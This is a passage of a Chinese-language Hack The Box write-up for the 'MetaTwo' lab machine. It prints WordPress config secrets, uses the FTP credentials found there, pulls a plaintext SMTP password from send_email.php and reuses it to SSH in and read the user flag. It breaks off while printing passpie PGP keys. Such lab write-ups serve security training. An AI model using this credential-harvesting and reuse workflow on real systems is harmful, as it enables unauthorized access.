class="hljs-string">&#x27;x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf&#123;=]a%&#x27;</span> );<br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="hljs-string">&#x27;J+mxCaP4z&lt;g.6P^t`ziv&gt;dd&#125;EEi%48%JnRq^2MjFiitn#&amp;n+HXv]||E+F~C&#123;qKXy&#x27;</span> );<br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;NONCE_KEY&#x27;</span>,        <span class="hljs-string">&#x27;SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q&#123;^z(F?)7mxNUg986tQO7O5&#x27;</span> );<br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;AUTH_SALT&#x27;</span>,        <span class="hljs-string">&#x27;[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*&lt;~:0]s&#125;d&lt;&amp;M;.,x0z~R&gt;3!D&#x27;</span> );<br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="hljs-string">&#x27;&gt;`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&amp;~omiH^jVC?2-I?I.&#x27;</span> );<br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="hljs-string">&#x27;4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw&#125;Y d~N=&amp;^JsI`M)FJTJEVI) N#NOidIf=&#x27;</span> );<br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;NONCE_SALT&#x27;</span>,       <span class="hljs-string">&#x27;.sU&amp;CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#&#125;w!Bq,h&#125;V9jKSkTGsv%Y451F8L=bL&#x27;</span> );<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * WordPress Database Table prefix.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-variable">$table_prefix</span> = <span class="hljs-string">&#x27;wp_&#x27;</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * For developers: WordPress debugging mode.</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@link</span> https://wordpress.org/support/article/debugging-in-wordpress/</span><br><span class="hljs-comment"> */</span><br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;WP_DEBUG&#x27;</span>, <span class="hljs-literal">false</span> );<br><br><span class="hljs-comment">/** Absolute path to the WordPress directory. */</span><br><span class="hljs-keyword">if</span> ( ! <span class="hljs-title function_ invoke__">defined</span>( <span class="hljs-string">&#x27;ABSPATH&#x27;</span> ) ) &#123;<br>        <span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;ABSPATH&#x27;</span>, <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/&#x27;</span> );<br>&#125;<br><br><span class="hljs-comment">/** Sets up WordPress vars and included files. */</span><br><span class="hljs-keyword">require_once</span> ABSPATH . <span class="hljs-string">&#x27;wp-settings.php&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>21、这里发现了配置的FTP的账号密码，那现在开始尝试登录下</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs tap">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ftp metapress.htb@metapress.htb<br>Connected to metapress.htb.<br>220 ProFTPD Server (Debian) [::ffff:10.10.11.186]<br>331 Password required for metapress.htb<br>Password: <br>230 User metapress.htb logged in<br>Remote system type is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; ls<br>229 Entering Extended Passive Mode (|||63901|)<br>150 Opening ASCII mode data connection for file list<br>drwxr-xr-x  <span class="hljs-number"> 5 </span>metapress.htb metapress.htb    <span class="hljs-number"> 4096 </span>Oct <span class="hljs-number"> 5 </span><span class="hljs-number"> 2022 </span>blog<br>drwxr-xr-x  <span class="hljs-number"> 3 </span>metapress.htb metapress.htb    <span class="hljs-number"> 4096 </span>Oct <span class="hljs-number"> 5 </span><span class="hljs-number"> 2022 </span>mailer<br>226 Transfer complete<br>ftp&gt; ls -R<br>229 Entering Extended Passive Mode (|||37079|)<br>150 Opening ASCII mode data connection for file list<br>drwxr-xr-x  <span class="hljs-number"> 5 </span>metapress.htb metapress.htb    <span class="hljs-number"> 4096 </span>Oct <span class="hljs-number"> 5 </span><span class="hljs-number"> 2022 </span>blog<br>drwxr-xr-x  <span class="hljs-number"> 3 </span>metapress.htb metapress.htb    <span class="hljs-number"> 4096 </span>Oct <span class="hljs-number"> 5 </span><span class="hljs-number"> 2022 </span>mailer<br>..................<br></code></pre></td></tr></table></figure>
+
+<p>22、可以看出来 blog 是wp博客的源码目录，然后 mailer 目录是邮箱相关的内容</p>
+<p>23、那把里面的文件下载到本地下</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ftp&gt; cd mailer<br>250 CWD command successful<br>ftp&gt; ls<br>229 Entering Extended Passive Mode (|||34470|)<br>150 Opening ASCII mode data connection for file list<br>drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5  2022 PHPMailer<br>-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22  2022 send<span class="hljs-emphasis">_email.php</span><br><span class="hljs-emphasis">226 Transfer complete</span><br><span class="hljs-emphasis">ftp&gt; get send_</span>email.php<br>local: send<span class="hljs-emphasis">_email.php remote: send_</span>email.php<br>229 Entering Extended Passive Mode (|||28132|)<br>150 Opening BINARY mode data connection for send<span class="hljs-emphasis">_email.php (1126 bytes)</span><br><span class="hljs-emphasis">100% |<span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">**|  1126        9.25 MiB/s    00:00 ETA</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">226 Transfer complete</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">1126 bytes received in 00:00 (2.74 KiB/s)</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">ftp&gt; </span></span><br></code></pre></td></tr></table></figure>
+
+<p>24、查看下里面的内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ cat send_email.php <br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * This script will be used to send an email to all our users when ready for launch</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">use</span> <span class="hljs-title">PHPMailer</span>\<span class="hljs-title">PHPMailer</span>\<span class="hljs-title">PHPMailer</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">PHPMailer</span>\<span class="hljs-title">PHPMailer</span>\<span class="hljs-title">SMTP</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">PHPMailer</span>\<span class="hljs-title">PHPMailer</span>\<span class="hljs-title">Exception</span>;<br><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;PHPMailer/src/Exception.php&#x27;</span>;<br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;PHPMailer/src/PHPMailer.php&#x27;</span>;<br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;PHPMailer/src/SMTP.php&#x27;</span>;<br><br><span class="hljs-variable">$mail</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PHPMailer</span>(<span class="hljs-literal">true</span>);<br><br><span class="hljs-variable">$mail</span>-&gt;SMTPDebug = <span class="hljs-number">3</span>;                               <br><span class="hljs-variable">$mail</span>-&gt;<span class="hljs-title function_ invoke__">isSMTP</span>();            <br><br><span class="hljs-variable">$mail</span>-&gt;Host = <span class="hljs-string">&quot;mail.metapress.htb&quot;</span>;<br><span class="hljs-variable">$mail</span>-&gt;SMTPAuth = <span class="hljs-literal">true</span>;                          <br><span class="hljs-variable">$mail</span>-&gt;Username = <span class="hljs-string">&quot;jnelson@metapress.htb&quot;</span>;                 <br><span class="hljs-variable">$mail</span>-&gt;Password = <span class="hljs-string">&quot;Cb4_JmWM8zUZWMu@Ys&quot;</span>;                           <br><span class="hljs-variable">$mail</span>-&gt;SMTPSecure = <span class="hljs-string">&quot;tls&quot;</span>;                           <br><span class="hljs-variable">$mail</span>-&gt;Port = <span class="hljs-number">587</span>;                                   <br><br><span class="hljs-variable">$mail</span>-&gt;From = <span class="hljs-string">&quot;jnelson@metapress.htb&quot;</span>;<br><span class="hljs-variable">$mail</span>-&gt;FromName = <span class="hljs-string">&quot;James Nelson&quot;</span>;<br><br><span class="hljs-variable">$mail</span>-&gt;<span class="hljs-title function_ invoke__">addAddress</span>(<span class="hljs-string">&quot;info@metapress.htb&quot;</span>);<br><br><span class="hljs-variable">$mail</span>-&gt;<span class="hljs-title function_ invoke__">isHTML</span>(<span class="hljs-literal">true</span>);<br><br><span class="hljs-variable">$mail</span>-&gt;Subject = <span class="hljs-string">&quot;Startup&quot;</span>;<br><span class="hljs-variable">$mail</span>-&gt;Body = <span class="hljs-string">&quot;&lt;i&gt;We just started our new blog metapress.htb!&lt;/i&gt;&quot;</span>;<br><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-variable">$mail</span>-&gt;<span class="hljs-title function_ invoke__">send</span>();<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Message has been sent successfully&quot;</span>;<br>&#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Mailer Error: &quot;</span> . <span class="hljs-variable">$mail</span>-&gt;ErrorInfo;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>25、这里获取到的账号密码，和前面的 etc&#x2F;passwd 里账号一样，那就登录下吧</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs elixir">┌──(kali㉿offsec)-[~/<span class="hljs-title class_">Desktop</span>]<br>└─<span class="hljs-variable">$ </span>ssh jnelson<span class="hljs-variable">@10</span>.<span class="hljs-number">10.11</span>.<span class="hljs-number">186</span>                                 <br><span class="hljs-title class_">The</span> authenticity of host <span class="hljs-string">&#x27;10.10.11.186 (10.10.11.186)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:0PexEedxcuaYF8COLPS2yzCpWaxg8+gsT1BRIpx/OSY.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.186</span><span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">jnelson@10.10.11.186&#x27;</span>s <span class="hljs-symbol">password:</span> <br><span class="hljs-title class_">Linux</span> meta2 <span class="hljs-number">5.10</span>.<span class="hljs-number">0</span><span class="hljs-number">-19</span>-amd64 <span class="hljs-comment">#1 SMP Debian 5.10.149-2 (2022-10-21) x86_64</span><br><br><span class="hljs-title class_">The</span> programs included <span class="hljs-keyword">with</span> the <span class="hljs-title class_">Debian</span> <span class="hljs-title class_">GNU</span>/<span class="hljs-title class_">Linux</span> system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br><span class="hljs-title class_">Debian</span> <span class="hljs-title class_">GNU</span>/<span class="hljs-title class_">Linux</span> comes <span class="hljs-keyword">with</span> <span class="hljs-title class_">ABSOLUTELY</span> <span class="hljs-title class_">NO</span> <span class="hljs-title class_">WARRANTY</span>, to the extent<br>permitted by applicable law.<br><span class="hljs-title class_">Last</span> <span class="hljs-symbol">login:</span> <span class="hljs-title class_">Tue</span> <span class="hljs-title class_">Oct</span> <span class="hljs-number">25</span> <span class="hljs-number">12</span><span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:</span><span class="hljs-number">26</span> <span class="hljs-number">2022</span> from <span class="hljs-number">10.10</span>.<span class="hljs-number">14.23</span><br>jnelson<span class="hljs-variable">@meta2</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>id<br>uid=<span class="hljs-number">1000</span>(jnelson) gid=<span class="hljs-number">1000</span>(jnelson) groups=<span class="hljs-number">1000</span>(jnelson)<br>jnelson<span class="hljs-variable">@meta2</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>pwd<br>/home/jnelson<br>jnelson<span class="hljs-variable">@meta2</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>ls<br>user.txt<br>jnelson<span class="hljs-variable">@meta2</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cat user.txt <br><span class="hljs-number">5</span>db42afc148b82f2764032f3d8392193<br>jnelson<span class="hljs-variable">@meta2</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span><br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>26、通过枚举发现用户根目录下存在 .passpie 文件夹，通过谷歌下这个文件名，发现是一个可以解密的工具</p>
+<p><img src="http://sh1yan.top/photo/MetaTwo-htb-writeup/10.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs tap">jnelson@meta2:~$ ls -la<br>total 32<br>drwxr-xr-x<span class="hljs-number"> 4 </span>jnelson jnelson<span class="hljs-number"> 4096 </span>Oct<span class="hljs-number"> 25 </span><span class="hljs-number"> 2022 </span>.<br>drwxr-xr-x<span class="hljs-number"> 3 </span>root    root   <span class="hljs-number"> 4096 </span>Oct <span class="hljs-number"> 5 </span><span class="hljs-number"> 2022 </span>..<br>lrwxrwxrwx<span class="hljs-number"> 1 </span>root    root      <span class="hljs-number"> 9 </span>Jun<span class="hljs-number"> 26 </span><span class="hljs-number"> 2022 </span>.bash_history -&gt; /dev/null<br>-rw-r--r--<span class="hljs-number"> 1 </span>jnelson jnelson <span class="hljs-number"> 220 </span>Jun<span class="hljs-number"> 26 </span><span class="hljs-number"> 2022 </span>.bash_logout<br>-rw-r--r--<span class="hljs-number"> 1 </span>jnelson jnelson<span class="hljs-number"> 3526 </span>Jun<span class="hljs-number"> 26 </span><span class="hljs-number"> 2022 </span>.bashrc<br>drwxr-xr-x<span class="hljs-number"> 3 </span>jnelson jnelson<span class="hljs-number"> 4096 </span>Oct<span class="hljs-number"> 25 </span><span class="hljs-number"> 2022 </span>.local<br>dr-xr-x---<span class="hljs-number"> 3 </span>jnelson jnelson<span class="hljs-number"> 4096 </span>Oct<span class="hljs-number"> 25 </span><span class="hljs-number"> 2022 </span>.passpie<br>-rw-r--r--<span class="hljs-number"> 1 </span>jnelson jnelson <span class="hljs-number"> 807 </span>Jun<span class="hljs-number"> 26 </span><span class="hljs-number"> 2022 </span>.profile<br>-rw-r-----<span class="hljs-number"> 1 </span>root    jnelson  <span class="hljs-number"> 33 </span>Sep<span class="hljs-number"> 23 </span>10:26 user.txt<br>jnelson@meta2:~$ tree .passpie/<br>-bash: tree: command not found<br>jnelson@meta2:~$ cd .passpie/<br>jnelson@meta2:~/.passpie$ ls -la<br>total 24<br>dr-xr-x---<span class="hljs-number"> 3 </span>jnelson jnelson<span class="hljs-number"> 4096 </span>Oct<span class="hljs-number"> 25 </span><span class="hljs-number"> 2022 </span>.<br>drwxr-xr-x<span class="hljs-number"> 4 </span>jnelson jnelson<span class="hljs-number"> 4096 </span>Oct<span class="hljs-number"> 25 </span><span class="hljs-number"> 2022 </span>..<br>-r-xr-x---<span class="hljs-number"> 1 </span>jnelson jnelson   <span class="hljs-number"> 3 </span>Jun<span class="hljs-number"> 26 </span><span class="hljs-number"> 2022 </span>.config<br>-r-xr-x---<span class="hljs-number"> 1 </span>jnelson jnelson<span class="hljs-number"> 5243 </span>Jun<span class="hljs-number"> 26 </span><span class="hljs-number"> 2022 </span>.keys<br>dr-xr-x---<span class="hljs-number"> 2 </span>jnelson jnelson<span class="hljs-number"> 4096 </span>Oct<span class="hljs-number"> 25 </span><span class="hljs-number"> 2022 </span>ssh<br>jnelson@meta2:~/.passpie$<br></code></pre></td></tr></table></figure>
+
+<p>27、然后对里面的文件进行了逐个的读看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs bash">jnelson@meta2:~/.passpie$ <span class="hljs-built_in">cat</span> .config <br>&#123;&#125;<br>jnelson@meta2:~/.passpie$ <span class="hljs-built_in">cat</span> .keys <br>-----BEGIN PGP PUBLIC KEY BLOCK-----<br><br>mQSuBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1<br>AiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD<br>/GYn9FIjUAWqnfdnttBbvBjseL4sECpmgxTIjKbWAXlqgEgNjXD306IweEy2FOho<br>3LpAXxfk8C/qUCKcpxaz0G2k0do4+VTKZ+5UDpqM5++soJqhCrUYudb9zyVyXTpT<br>ZjMvyXe5NeC7JhBCKh+/Wqc4xyBcwhDdW+WU54vuFUthn+PUubEN1m+s13BkyvHV<br>gNAM4v6terRItXdKvgvHtJxE0vhlNSjFAedACHC4sN+dRqFu4li8XPIVYGkuK9pX<br>5xA6Nj+8UYRoZrP4SYtaDslT63ZaLd2MvwP+xMw2XEv8Uj3TGq6BIVWmajbsqkEp<br>tQkU7d+nPt1aw2sA265vrIzry02NAhxL9YQGNJmXFbZ0p8cT3CswedP8XONmVdxb<br>a1UfdG+soO3jtQsBAKbYl2yF/+D81v+42827iqO6gqoxHbc/0epLqJ+Lbl8hC/sG<br>WIVdy+jynHb81B3FIHT832OVi2hTCT6vhfTILFklLMxvirM6AaEPFhxIuRboiEQw<br>8lQMVtA1l+Et9FXS1u91h5ZL5PoCfhqpjbFD/VcC5I2MhwL7n50ozVxkW2wGAPfh<br>cODmYrGiXf8dle3z9wg9ltx25XLsVjoR+VLm5Vji85konRVuZ7TKnL5oXVgdaTML<br>qIGqKLQfhHwTdvtYOTtcxW3tIdI16YhezeoUioBWY1QM5z84F92UVz6aRzSDbc/j<br>FJOmNTe7+ShRRAAPu2qQn1xXexGXY2BFqAuhzFpO/dSidv7/UH2+x33XIUX1bPXH<br>FqSg+11VAfq3bgyBC1bXlsOyS2J6xRp31q8wJzUSlidodtNZL6APqwrYNhfcBEuE<br>PnItMPJS2j0DG2V8IAgFnsOgelh9ILU/OfCA4pD4f8QsB3eeUbUt90gmUa8wG7uM<br>FKZv0I+r9CBwjTK3bg/rFOo+DJKkN3hAfkARgU77ptuTJEYsfmho84ZaR3KSpX4L<br>/244aRzuaTW75hrZCJ4RxWxh8vGw0+/kPVDyrDc0XNv6iLIMt6zJGddVfRsFmE3Y<br>q2wOX/RzICWMbdreuQPuF0CkcvvHMeZX99Z3pEzUeuPu42E6JUj9DTYO8QJRDFr+<br>F2mStGpiqEOOvVmjHxHAduJpIgpcF8z18AosOswa8ryKg3CS2xQGkK84UliwuPUh<br>S8wCQQxveke5/IjbgE6GQOlzhpMUwzih7+15hEJVFdNZnbEC9K/ATYC/kbJSrbQM<br>RfcJUrnjPpDFgF6sXQJuNuPdowc36zjE7oIiD69ixGR5UjhvVy6yFlESuFzrwyeu<br>TDl0UOR6wikHa7tF/pekX317ZcRbWGOVr3BXYiFPTuXYBiX4+VG1fM5j3DCIho20<br>oFbEfVwnsTP6xxG2sJw48Fd+mKSMtYLDH004SoiSeQ8kTxNJeLxMiU8yaNX8Mwn4<br>V9fOIdsfks7Bv8uJP/lnKcteZjqgBnXPN6ESGjG1cbVfDsmVacVYL6bD4zn6ZN/n<br>WLQzUGFzc3BpZSAoQXV0by1nZW5lcmF0ZWQgYnkgUGFzc3BpZSkgPHBhc3NwaWVA<br>bG9jYWw+iJAEExEIADgWIQR8Z4anVhvIT1BIZx44d3XDV0XSAwUCYrhX1gIbIwUL<br>CQgHAgYVCgkICwIEFgIDAQIeAQIXgAAKCRA4d3XDV0XSA0RUAP91ekt2ndlvXNX6<br>utvl+03LgmilpA5OHqmpRWd24UhVSAD+KiO8l4wV2VOPkXfoGSqe+1DRXanAsoRp<br>dRqQCcshEQ25AQ0EYrhX1hAEAIQaf8Vj0R+p/jy18CX9Di/Jlxgum4doFHkTtpqR<br>ZBSuM1xOUhNM58J/SQgXGMthHj3ebng2AvYjdx+wWJYQFGkb5VO+99gmOk28NY25<br>hhS8iMUu4xycHd3V0/j8q08RfqHUOmkhIU+CWawpORH+/+2hjB+FHF7olq4EzxYg<br>6L4nAAMFA/4ukPrKvhWaZT2pJGlju4QQvDXQlrASiEHD6maMqBGO5tJqbkp+DJtM<br>F9UoDa53FBRFEeqclY6kQUxnzz48C5WsOc31fq+6vj/40w9PbrGGBYJaiY/zouO1<br>FU9d04WCssSi9J5/BiYiRwFqhMRXqvHg9tqUyKLnsq8mwn0Scc5SVYh4BBgRCAAg<br>FiEEfGeGp1YbyE9QSGceOHd1w1dF0gMFAmK4V9YCGwwACgkQOHd1w1dF0gOm5gD9<br>GUQfB+Jx/Fb7TARELr4XFObYZq7mq/NUEC+Po3KGdNgA/04lhPjdN3wrzjU3qmrL<br>fo6KI+w2uXLaw+bIT1XZurDN<br>=dqsF<br>-----END PGP PUBLIC KEY BLOCK-----<br>-----BEGIN PGP PRIVATE KEY 